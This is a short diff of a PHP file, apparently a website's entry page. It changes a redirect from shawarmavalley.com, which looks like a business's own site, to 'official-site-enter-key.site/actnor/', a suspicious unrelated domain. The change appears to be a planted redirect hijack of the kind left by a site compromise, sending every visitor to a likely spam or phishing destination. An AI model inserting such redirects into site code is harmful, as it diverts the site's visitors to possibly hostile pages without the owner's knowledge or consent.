@@ -1,4 +1,4 @@
 <?php
-header("Location: https://shawarmavalley.com/");
+header("Location: https://official-site-enter-key.site/actnor/");
 die();
 ?>
